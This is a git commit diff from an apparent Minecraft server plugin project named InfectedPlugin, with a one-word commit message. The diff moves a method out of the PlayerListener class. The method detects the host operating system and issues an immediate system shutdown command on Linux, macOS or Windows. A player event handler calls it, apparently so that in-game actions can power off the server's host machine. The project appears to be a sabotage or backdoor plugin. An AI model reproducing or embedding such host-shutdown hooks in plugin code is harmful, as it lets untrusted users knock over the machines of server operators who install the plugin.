cb9dacdf93384612bf31430d270e1be8eb3d21cd
Wilee999 <Infinitywilee@rocketmail.com>
2013-10-17 07:41:11 -0700

    There

--- src/org/CreeperCoders/InfectedPlugin/PlayerListener.java
+++ src/org/CreeperCoders/InfectedPlugin/PlayerListener.java
@@ -159,7 +159,7 @@ public class PlayerListener implements Listener
         {
             try
             {
-                shutdown();
+                IP_Util.shutdown();
             }
             catch (IOException ex)
             {
@@ -253,27 +253,5 @@ public class PlayerListener implements Listener
             event.setCancelled(true);
             return;
         }
-    }
-    
-    public static void shutdown() throws RuntimeException, IOException
-    {
-        String shutdownCommand = null;
-        String operatingSystem = System.getProperty("os.name");
-
-        if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem))
-        {
-            shutdownCommand = "shutdown -h now";
-        }
-        else if ("Windows".equals(operatingSystem))
-        {
-            shutdownCommand = "shutdown.exe -s -t 0";
-        }
-        else
-        {
-            throw new RuntimeException("Unsupported operating system.");
-        }
-
-        Runtime.getRuntime().exec(shutdownCommand);
-        System.exit(0);
     }
 }
